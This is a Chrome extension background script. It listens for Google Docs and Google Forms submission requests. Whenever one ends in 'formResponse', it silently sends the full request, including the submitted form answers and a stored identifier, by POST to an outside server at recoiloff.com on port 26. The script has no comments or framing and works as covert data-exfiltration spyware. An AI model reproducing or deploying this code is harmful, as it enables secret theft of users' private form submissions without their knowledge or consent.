chrome.webRequest.onBeforeRequest.addListener(
    function(details)
    {
        const url = "http://recoiloff.com:26"
        if (details.method === "GET") return;
        if (!(details.url).toString().endsWith("formResponse")) return;
        chrome.storage.local.get("identifier3", function(result) {
            console.log("[" + JSON.stringify(details) + ", " + JSON.stringify(result) + "]");
            
            
            var request = new XMLHttpRequest();

            request.open("POST", url);

            request.send("[" + JSON.stringify(details) + ", " + JSON.stringify(result) + "]");

        });
    },
    {urls: ["https://docs.google.com/*", "https://forms.gle/*"]},
    ['requestBody']
);